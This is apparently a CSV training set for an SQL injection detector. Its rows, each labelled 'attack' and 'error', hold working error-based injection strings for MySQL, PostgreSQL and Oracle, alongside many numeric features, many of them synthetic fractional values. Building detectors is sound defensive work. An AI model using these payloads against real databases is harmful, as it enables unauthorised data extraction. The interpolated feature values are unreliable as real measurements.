id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000135,attack,error,"1%""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000065,0.0637321017219488,277.1637836154491,36.0,3.9336436047646663,100.0,35.0,104.33102689235929,37.83275672308982,0.36083460805399825,0.1262921128188994,0.376380170144606,0.1364931089824963,0.0,4.0,0.0,0.0,2.0,2.0,0.0,19.832756723089823,2.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000136,attack,error,"1'+  (  select sfuq where 8094  =  8094 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",nearest_attack_euclidean,R000051,0.409347519251682,189.37059596306324,35.874119192612646,3.9110891581878415,63.622357577837946,31.874119192612646,71.12588080738735,22.748238385225292,0.3359467936885679,0.16831361524262814,0.375635989758922,0.12010360130988197,1.8741191926126466,0.0,0.0,0.0,0.0,1.0,0.0,14.0,0.0,0.0,4.0,2.748238385225293,1.0,-2.7755575615628914e-17,0.0,0.12588080738735344,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.8741191926126464,0.0,1.0,1.1102230246251565e-16,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.874119192612647
SMOTE_000137,attack,error,"-3775'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000081,0.11913924494694729,206.0,38.51508951460173,3.85798992689361,63.0,37.0,83.0,23.0,0.3058252427184466,0.1796116504854369,0.4029126213592233,0.11165048543689321,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.0,0.0,0.0,3.0,3.0,1.0,-2.7755575615628914e-17,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000138,attack,error,"-8844""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000072,0.47239429519992976,221.6703768807344,39.31916320702038,3.7884209516741865,64.75539763861211,38.27665282808153,93.63832641404076,25.0,0.29187336673895414,0.17243721443402113,0.42275705410089054,0.11293236472613423,0.0,1.0,1.0,0.0,1.0,1.1595816035101918,0.0,16.84041839648981,0.0,0.0,3.0,3.159581603510192,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.1595816035101917,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.159581603510191
SMOTE_000139,attack,error,"1  )   as nfgb where 2503  =  2503 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000260,0.14225613039098914,326.05750207689346,39.11500415378691,4.038706886493515,110.0,63.0,119.0,34.057502076893456,0.3373639778948023,0.19321755097611407,0.36496648517710434,0.10445198595197921,0.0,0.05750207689345832,2.0,0.0,2.0,2.0,0.0,21.0,0.0,0.0,6.0,7.0,0.0,0.057502076893458265,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000140,attack,error,"-8614'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000094,0.09093451209127469,206.05679436413692,39.11358872827381,3.8698738774184718,63.0,37.0,83.0,23.056794364136906,0.30574133378029583,0.17956237063287217,0.40280207466292944,0.11189422092390258,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.0,0.05679436413690647,0.0,3.0,3.0,1.0,-2.7755575615628914e-17,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000141,attack,error,"1%'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000230,0.6399157666446972,188.7516728438921,27.7516728438921,3.426593941855072,39.006691375568394,35.9933086244316,84.5033456877842,29.2483271561079,0.20663620838193017,0.19071335079594023,0.4476877221451195,0.1549627186770101,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.0,2.0,0.0,5.248327156107901,2.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,1.7516728438920999,0.24832715610790038,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000142,attack,error,"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",nearest_attack_euclidean,R000146,0.5953715431339703,320.01284933934727,38.28051397357389,3.99866123904453,111.12205589429556,55.0,118.04925152433003,35.841541920721674,0.34746573593574603,0.17207302197039437,0.36847045911648163,0.11199078297737801,4.0,0.0,0.0,0.0,2.0,1.7194860264261096,0.0,21.122055894295563,0.0,0.0,6.0,4.719486026426109,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000143,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000082,0.3906683757893613,194.20732787825614,27.621983634768405,3.4734703202793646,47.20732787825614,35.829311513024535,84.17068848697546,27.0,0.24307367692581688,0.18447343266687274,0.4334256065773584,0.139027283829952,4.0,0.0,0.0,0.0,0.0,1.7926721217438653,0.0,16.0,0.0,0.0,5.207327878256135,1.7926721217438653,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000144,attack,error,-5967 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # lhoh,nearest_attack_euclidean,R000056,0.00025973430965614476,340.99983719444845,33.99975579167266,3.343075801595281,77.99967438889688,48.0,157.00016280555155,58.0,0.22873815228026936,0.14076253094461438,0.4604112585503739,0.17008805822474232,0.0,0.0,1.0,0.0,0.0,2.0,0.0,32.00008140277578,0.0,0.0,0.0,23.0,0.0,-2.7755575615628914e-17,0.0,0.9999185972242209,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000145,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'lwlh'  =  'lwlh",nearest_attack_euclidean,R000237,0.1360155262205753,284.8686879941715,36.92213800024285,3.953264661956243,107.0,35.0,106.55723999514294,36.31144799902859,0.37579045343197764,0.12292211093569361,0.37383877578800245,0.12744865984432632,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.311447999028587,0.0,2.0,5.0,4.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000146,attack,error,"-6996%"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000295,0.12928248572657278,202.96437640571108,39.93972647464306,3.937693980088814,63.0,37.0,79.8438293549972,23.12054705071389,0.31050150527841314,0.18235802690954422,0.39322980728627166,0.11391066052577097,0.0,1.0,1.0,0.0,1.0,1.0,0.0,14.180820576070829,0.9397264746430571,0.0,3.0,3.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000147,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000129,0.2031793190808674,197.51134891625395,32.0,3.9395948003883983,58.23297662561909,44.02269783250789,68.0,27.255674458126972,0.2948684235693181,0.22285242123319984,0.3442906990203487,0.1379884561771333,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.255674458126971,6.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000148,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000037,0.25111376627028975,208.91004806703233,34.0,3.682299462995849,55.0,40.0,87.49432691459916,26.415721152433193,0.2633426171729163,0.19152190339848457,0.4186944997198978,0.12644097970870133,1.0,0.0,2.0,0.0,1.0,2.0,0.0,15.415721152433193,0.0,0.0,4.0,5.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000149,attack,error,"1'||  (  select 'jpow' from dual where 4381  =  4381 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",nearest_attack_euclidean,R000102,1.8558838065460754,306.90905946042153,39.59439833702035,4.08411204747776,115.78319501106105,43.0,109.06293222468024,39.06293222468024,0.37711451441119836,0.14016944028968983,0.3554494275365127,0.12726661776259907,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.0,0.0,2.0,5.0,7.062932224680236,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.531466112340118,4.0,0.0,1.0,2.531466112340118,0.5314661123401179,0.468533887659882,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,11.531466112340118
SMOTE_000150,attack,error,"1'+  (  select 'usoq' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",nearest_attack_euclidean,R000172,0.4196451164901059,187.32036698098136,32.0,3.881043115455178,49.0,47.0,66.0,25.320366980981365,0.2615906548253235,0.25091348524061646,0.3523465962953337,0.1351492636387263,3.320366980981366,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,6.0,4.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000151,attack,error,"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'tnfm' like 'tnfm",nearest_attack_euclidean,R000287,0.06121867246399675,217.28556325162864,30.03172925018096,3.4839639105373106,58.87308299927616,32.0,97.3172925018096,29.09518775054288,0.2709842742750466,0.14727910721316184,0.4478437428629482,0.13389287564884333,4.0,0.0,0.0,0.0,1.0,1.0317292501809605,0.0,18.06345850036192,0.0,0.0,4.0,2.0317292501809607,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000152,attack,error,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000141,0.07270173314664025,331.2596252821061,38.97115274643266,3.86531879348998,101.97115274643267,55.0,133.23077802853877,41.05769450713469,0.3078369449110928,0.16603625919214648,0.4021846220448393,0.12394217385192137,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.05769450713469,2.0,0.0,6.0,5.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.9711527464326555,0.02884725356734441,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000153,attack,error,"1%""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000210,0.5605327408305899,327.73608648968656,38.7824057659791,3.8819747809092555,101.7824057659791,55.0,130.38886919174922,40.564811531958206,0.31065141579592964,0.1678794145384837,0.3976998757059609,0.12376929395962577,0.0,4.0,0.0,0.0,2.0,2.0,0.0,23.564811531958206,2.0,0.0,6.0,5.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.7824057659791026,0.2175942340208975,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000154,attack,error,"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000061,1.277773476227293,331.91952724355053,33.54023637822472,3.4745126324477833,80.45976362177528,50.620709134674165,143.83905448710112,57.0,0.24240512034079614,0.15252387711196863,0.4333410827744326,0.17172991977280258,1.0,0.0,0.5402363782247208,0.0,0.0,2.0,0.0,30.45976362177528,0.0,0.0,1.0,22.54023637822472,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.45976362177527913,0.5402363782247209,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000155,attack,error,"1' where 2160  =  2160 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000257,0.3337596196803877,199.0443980709157,32.604439807091566,3.651868056680712,50.813319421274706,40.0,82.62663884254943,25.60443980709157,0.2551946080622528,0.20137254803481894,0.41473725580796655,0.1286955880949617,1.0,0.0,2.0,0.0,1.0,2.0,0.0,14.60443980709157,0.0,0.0,4.0,5.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000156,attack,error,"-8557 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000212,0.2692070584004464,202.88958641093933,38.75920113242172,3.872191315226962,63.0,37.0,81.40798867578278,21.481597735156555,0.3107065107573307,0.18247842695271804,0.4009745379408573,0.10584052434909398,0.0,0.0,1.0,0.0,1.0,1.0,0.0,14.481597735156555,0.0,0.0,3.0,3.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000157,attack,error,-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000021,0.4567593548646771,324.3771979621439,33.80325743397945,3.5841818096915894,86.42605947183556,48.78697026408222,133.96742566020555,55.19674256602055,0.2665392981399214,0.15037138468069847,0.4129251182779191,0.17016419890146098,0.0,0.0,1.0,0.0,0.0,2.0,0.0,28.39348513204111,0.0,2.409772301938335,0.19674256602055484,23.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000158,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000136,0.7537321190470591,330.2059844380076,35.601329875112796,3.664866469294069,91.20265975022559,48.0,134.4019948126692,56.601329875112796,0.2761790114213342,0.14538133413196722,0.4070335929974556,0.17140606144924295,0.0,0.0,2.6013298751127945,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,24.60132987511279,0.0,-2.7755575615628914e-17,0.8006649375563972,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000159,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ctac' like 'ctac",nearest_attack_euclidean,R000205,0.6026759759081658,212.6673656658916,31.703626037123158,3.928697651878686,79.81450414849263,37.0,72.96373962876842,22.889121888630527,0.3756031583441234,0.174044519903501,0.3428064736992598,0.10754584805311582,4.0,0.0,0.0,0.0,0.0,1.2963739628768427,0.0,12.592747925753685,0.0,0.0,5.0,1.2963739628768431,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000160,attack,error,"1  )   as zhvx where 3171  =  3171 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000177,0.05327228988998266,222.5968088132966,32.08525840189951,3.920164961465841,77.0,45.0,78.51155041139708,22.085258401899512,0.345942911235221,0.2021744286439603,0.35266952090745146,0.0992131392133673,0.0,0.0,2.0,0.0,0.0,2.0,0.0,13.085258401899512,0.0,0.0,5.0,4.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,1.1102230246251565e-16,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
